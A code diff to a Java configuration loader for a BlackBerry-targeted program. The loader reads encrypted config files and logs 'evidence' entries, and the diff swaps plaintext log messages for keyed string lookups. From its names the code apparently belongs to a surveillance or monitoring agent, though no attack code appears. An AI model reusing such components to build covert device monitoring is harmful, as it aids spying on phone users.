@@ -12,6 +12,7 @@ package blackberry.config;
 import java.io.InputStream;
 
 import blackberry.GeneralException;
+import blackberry.Messages;
 import blackberry.Status;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Check;
@@ -33,7 +34,7 @@ public final class ConfLoader {
 
     /** The debug instance. */
     //#ifdef DEBUG
-    private static Debug debug = new Debug("ConfLoader", DebugLevel.VERBOSE);
+    private static Debug debug = new Debug("ConfLoader", DebugLevel.VERBOSE); //$NON-NLS-1$
     //#endif
 
     private Status status;
@@ -55,7 +56,7 @@ public final class ConfLoader {
         //final byte[] confKey = Encryption.getKeys().getConfKey();
 
         //#ifdef DEBUG
-        debug.trace("load: " + Encryption.getKeys().log);
+        debug.trace("load: " + Encryption.getKeys().log); //$NON-NLS-1$
         //#endif
 
         AutoFile file;
@@ -63,24 +64,24 @@ public final class ConfLoader {
         file = new AutoFile(Path.conf(), Cfg.NEW_CONF);
         if (file.exists()) {
             //#ifdef DEBUG
-            debug.info("Try: new config");
+            debug.info("Try: new config"); //$NON-NLS-1$
             //#endif
 
             loaded = loadConfFile(file, true);
 
             if (loaded) {
                 //#ifdef DEBUG
-                debug.info("New config");
+                debug.info("New config"); //$NON-NLS-1$
                 //#endif
                 file.rename(Cfg.ACTUAL_CONF, true);
-                Evidence.info("New configuration activated");
+                Evidence.info(Messages.getString("r.0")); //$NON-NLS-1$
                 loaded = true;
             } else {
                 //#ifdef DEBUG
-                debug.error("Reading new configuration");
+                debug.error("Reading new configuration"); //$NON-NLS-1$
                 //#endif
                 file.delete();
-                Evidence.info("Invalid new configuration, reverting");
+                Evidence.info(Messages.getString("r.1")); //$NON-NLS-1$
 
             }
         }
@@ -96,13 +97,13 @@ public final class ConfLoader {
 
         if (!loaded) {
             //#ifdef DEBUG
-            debug.warn("Reading Conf from resources");
+            debug.warn("Reading Conf from resources"); //$NON-NLS-1$
             //#endif
 
             InputStream inputStream = InstanceConfig.getConfig();
             if (inputStream != null) {
                 //#ifdef DBC
-                Check.asserts(inputStream != null, "Resource config");
+                Check.asserts(inputStream != null, "Resource config"); //$NON-NLS-1$
                 //#endif            
 
                 byte[] resource;
@@ -123,12 +124,12 @@ public final class ConfLoader {
                 loaded = conf.loadConfiguration(true);
 
                 //#ifdef DEBUG
-                debug.trace("load Info: Resource file loaded: " + loaded);
+                debug.trace("load Info: Resource file loaded: " + loaded); //$NON-NLS-1$
                 //#endif        
 
             } else {
                 //#ifdef DEBUG
-                debug.error("Cannot read config from resources");
+                debug.error("Cannot read config from resources"); //$NON-NLS-1$
                 //#endif
                 loaded = false;
             }
@@ -162,12 +163,12 @@ public final class ConfLoader {
                 // Load the configuration
                 loaded = conf.loadConfiguration(instantiate);
                 //#ifdef DEBUG
-                debug.trace("loadConfFile Conf file loaded: " + loaded);
+                debug.trace("loadConfFile Conf file loaded: " + loaded); //$NON-NLS-1$
                 //#endif
             }
         } else {
             //#ifdef DEBUG
-            debug.trace("loadConfFile: empty resource");
+            debug.trace("loadConfFile: empty resource"); //$NON-NLS-1$
             //#endif
         }
 
@@ -179,7 +180,7 @@ public final class ConfLoader {
         boolean loaded = false;
 
         //#ifdef DEBUG
-        debug.trace("loadConfFile: " + file);
+        debug.trace("loadConfFile: " + file); //$NON-NLS-1$
         //#endif
 
         final byte[] resource = file.read();
@@ -189,7 +190,7 @@ public final class ConfLoader {
 
     public boolean verifyNewConf() {
         //#ifdef DEBUG
-        debug.trace("verifyNewConf");
+        debug.trace("verifyNewConf"); //$NON-NLS-1$
         //#endif
         AutoFile file = new AutoFile(Path.conf(), Cfg.NEW_CONF);
         boolean loaded = false;
